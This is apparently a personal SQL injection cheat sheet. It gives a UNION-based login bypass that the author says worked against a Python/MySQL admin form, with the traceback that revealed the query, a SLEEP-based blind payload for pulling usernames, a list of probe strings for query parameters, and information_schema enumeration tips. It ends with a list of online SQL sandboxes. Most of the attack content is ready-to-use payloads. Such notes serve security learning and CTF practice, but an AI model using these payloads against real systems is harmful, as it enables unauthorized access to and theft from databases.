SQLI

## Tips 

- If you try an injection and you have a good error message, analyze it before going on.

## Example of an error with a login screen
 
- Payload : ```' UNION select table_schema,table_name FROM information_Schema.tables;#```
- Error : 
```
Traceback (most recent call last):
  File "./main.py", line 145, in do_login
    if cur.execute('SELECT password FROM admins WHERE username=\'%s\'' % request.form['username'].replace('%', '%%')) == 0:
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py", line 255, in execute
    self.errorhandler(self, exc, value)
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py", line 50, in defaulterrorhandler
    raise errorvalue
OperationalError: (1222, 'The used SELECT statements have a different number of columns')
```

Here we can see that there is a select on the admin table. So if I change my payload with this information, and an always true statement :
username: `' UNION select 1 FROM admins WHERE 1=1;#`
pass: `1`
We are logged in !

## Blind SQLI with sleep extracting username and password on login screen

- Always with our previous login screen, we will try to extract the username
- `'UNION SELECT SLEEP(1*CHAR_LENGTH(username)) FROM admins;#`

## List
```
/?q=1
/?q=1'
/?q=1"
/?q=[1]
/?q[]=1
/?q=1`
/?q=1\
/?q=1/*'*/
/?q=1/*!1111'*/
/?q=1'||'asd'||'  <== concat string
/?q=1' or '1'='1
/?q=1 or 1=1
/?q='or''='
```

---


## Sandboxes databases
By @hackerscrolls

SQL Fiddle (sqlfiddle.com)
DB Fiddle (db-fiddle.com)
EverSQL (eversql.com)

EverSQL supports:

Oracle
MySQL
MariaDB
PostreSQL
MS SQL Server
Percona Server
Amazon Aurora MySQL

DB Fiddle supports:

MySQL
SQLite
PostgreSQL
(multiple versions)

SQL Fiddle supports:

Oracle
SQLite
MySQL
PostgreSQL
MS SQL Server 2017

## Useful ones in MySQL

current_user()
version()
database()


### information_schema.columns table

table_name / column_name (you can use CONCAT : UNION SELECT 1,2,concat(table_name, ':', column_name) ...) FROM information_schema.columns

Then use the value from column_name to found useful information

SELECT * from <column_name>